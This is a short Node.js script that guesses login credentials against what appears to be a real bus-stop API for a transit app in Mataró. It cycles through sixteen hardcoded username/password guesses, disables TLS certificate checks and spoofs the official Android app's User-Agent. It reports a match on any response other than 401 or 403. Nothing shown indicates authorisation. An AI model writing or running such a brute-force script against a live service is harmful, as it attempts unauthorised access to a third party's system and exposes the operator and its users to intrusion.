const https = require('https');

const candidates = [
  { u: 'matarobus', p: 'matarobus' },
  { u: 'mataro', p: 'mataro' },
  { u: 'app', p: 'app' },
  { u: 'app', p: 'matarobus' },
  { u: 'geoactio', p: 'geoactio' },
  { u: 'avanza', p: 'avanza' },
  { u: 'ctsa', p: 'ctsa' },
  { u: 'android', p: 'android' },
  { u: 'public', p: 'public' },
  { u: 'client', p: 'client' },
  { u: 'matarobus_app', p: 'matarobus_app' },
  { u: 'mataro_bus', p: 'mataro_bus' },
  { u: 'user', p: 'pass' },
  { u: 'api', p: 'api' },
  { u: 'guest', p: 'guest' },
  { u: 'avanzagrupo', p: 'avanzagrupo' }
];

function tryAuth(user, pass) {
  return new Promise((resolve) => {
    const options = {
      rejectUnauthorized: false,
      headers: {
        'User-Agent': 'MataroBus/2.4.0 (Android; com.geoactio.matarobus)',
        'user': user,
        'pass': pass,
        'Accept': 'application/json',
        'Authorization': 'Basic ' + Buffer.from(`${user}:${pass}`).toString('base64')
      },
      timeout: 4000
    };

    https.get('https://matarobus.geoactio.com/api/paradas', options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        resolve({ user, pass, status: res.statusCode, body: data.substring(0, 300) });
      });
    }).on('error', (err) => resolve({ user, pass, err: err.message }));
  });
}

async function run() {
  console.log('Testing GeoActio credentials candidates...');
  for (const c of candidates) {
    const res = await tryAuth(c.u, c.p);
    console.log(`[${res.status}] User: "${res.user}", Pass: "${res.pass}" -> ${res.body}`);
    if (res.status === 200 || (res.status !== 401 && res.status !== 403)) {
      console.log('🎉 MATCH FOUND:', res);
      break;
    }
  }
}

run().catch(console.error);
